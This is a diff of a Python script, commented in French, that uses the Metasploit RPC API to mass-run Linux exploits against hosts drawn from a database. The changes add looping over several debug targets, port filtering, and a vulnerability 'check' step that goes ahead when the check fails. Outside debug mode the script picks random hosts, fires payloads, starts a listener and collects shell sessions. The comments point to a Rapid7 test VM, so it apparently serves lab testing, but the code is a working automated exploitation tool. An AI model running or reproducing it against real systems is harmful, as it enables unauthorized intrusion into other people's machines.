@@ -176,16 +176,16 @@ def build_targeted_exploits(client, services):
     return exploits
 
 
-# Récupérer l'hôte de debug depuis host_debug (VM Rapid7 de test)
-def get_debug_host():
+# Récupérer tous les hôtes de debug depuis host_debug, ordonnés par id
+def get_all_debug_hosts():
     try:
         with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
             with conn.cursor() as cur:
-                cur.execute("SELECT id, address FROM host_debug LIMIT 1;")
-                return cur.fetchone() or (None, None)
+                cur.execute("SELECT id, address FROM host_debug ORDER BY id;")
+                return cur.fetchall()
     except psycopg2.Error as e:
-        print(f"[ERREUR] Problème lors de la récupération de l'hôte debug : {e}")
-        return None, None
+        print(f"[ERREUR] Problème lors de la récupération des hôtes debug : {e}")
+        return []
 
 
 # Récupérer un hôte aléatoire depuis la base de données
@@ -220,6 +220,27 @@ def kill_process_by_name(process_name):
                 print(f"[ERREUR] Temps d'attente expiré pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
             return
 
+
+
+def check_target(console, fullname, rhosts, rport):
+    """Lance MSF check sur la cible. Retourne False si explicitement non vulnérable."""
+    try:
+        console.read()  # vider buffer
+        cmds = f"use {fullname}\nset RHOSTS {rhosts}\n"
+        if rport:
+            cmds += f"set RPORT {rport}\n"
+        cmds += "check\n"
+        console.write(cmds)
+        for _ in range(15):
+            time.sleep(1)
+            if not console.is_busy():
+                break
+        data = console.read()['data'].lower()
+        if any(s in data for s in ['not exploitable', 'not vulnerable', 'safe', 'does not appear', 'cannot exploit']):
+            return False
+        return True
+    except Exception:
+        return True  # en cas d'erreur, procéder quand même
 
 
 # Boucle principale
@@ -267,7 +288,14 @@ def main():
     else:
         print("[WARN] LHOST non défini, listener non démarré")
 
-    if not DEBUG_MODE:
+    if DEBUG_MODE:
+        debug_hosts = get_all_debug_hosts()
+        if not debug_hosts:
+            print("[DEBUG] Aucun hôte dans host_debug. Créer la table et insérer l'IP cible.")
+            return
+        print(f"[DEBUG] {len(debug_hosts)} hôte(s) à traiter séquentiellement.")
+        debug_index = 0
+    else:
         search_results = client.modules.search('linux')
 
     while True:
@@ -275,29 +303,32 @@ def main():
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
      if DEBUG_MODE:
-         host_id, host = get_debug_host()
-         if not host_id:
-             print("[DEBUG] Aucun hôte dans host_debug. Créer la table et insérer l'IP cible.")
-             return
-         print(f"[DEBUG] Mode debug actif — cible fixe : {host}")
+         if debug_index >= len(debug_hosts):
+             print("[DEBUG] Tous les hôtes debug traités — fin.")
+             break
+         host_id, host = debug_hosts[debug_index]
+         debug_index += 1
+         print(f"[DEBUG] Mode debug — cible {debug_index}/{len(debug_hosts)} : {host}")
          services = get_host_services_by_address(str(host))
          if not services:
-             print(f"[DEBUG] Aucun service connu pour {host} — attendre scan bm12, retry dans 30s...")
-             time.sleep(30)
+             print(f"[DEBUG] Aucun service connu pour {host} — skip.")
              continue
          print(f"[DEBUG] {len(services)} services: {[(p, s) for p, s in services]}")
          search_results = build_targeted_exploits(client, services)
          min_date = "2000-01-01"
      else:
          host_id, host = get_random_host('Linux')
+         services = get_host_services_by_address(str(host))
          min_date = "2021-01-01"
 
      if not host:
          print("[INFO] Aucun hôte disponible.")
          return
 
-     print(f"[INFO] Scan de {host} en cours...")
+     open_ports = {port for port, _ in services} if services else set()
+     print(f"[INFO] Scan de {host} en cours... ports ouverts: {sorted(open_ports)}")
 
+     check_con = client.consoles.console()
      for index in range(1, len(search_results)):
         if (search_results[index]['type'] != 'exploit'):
             print('+', end="")
@@ -315,6 +346,14 @@ def main():
             continue
 
         exploit.target = 0
+        try:
+            rport = exploit.runoptions.get('RPORT')
+            if rport is not None and open_ports:
+                if int(rport) not in open_ports:
+                    continue
+                exploit['RPORT'] = int(rport)
+        except (TypeError, ValueError):
+            pass
         payload = exploit.targetpayloads()
         missing  =  exploit.missing_required
         if (len(missing) > 0):
@@ -344,6 +383,11 @@ def main():
             continue
         print (f"missing résolus : {search_results[index]['fullname']}")
 
+        if not check_target(check_con, search_results[index]['fullname'],
+                            exploit.runoptions.get('RHOSTS'), exploit.runoptions.get('RPORT')):
+            print(f"[CHECK] Non vulnérable — skip")
+            continue
+
 #        print (exploit.runoptions)
 #        print (f" payload {payload}")
         payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
@@ -364,6 +408,7 @@ def main():
                    print("+",end="")
                    time.sleep(1)
 
+     check_con.destroy()
      print(f"[INFO] Scan de {host} terminé.")
 
      sessions = client.sessions.list
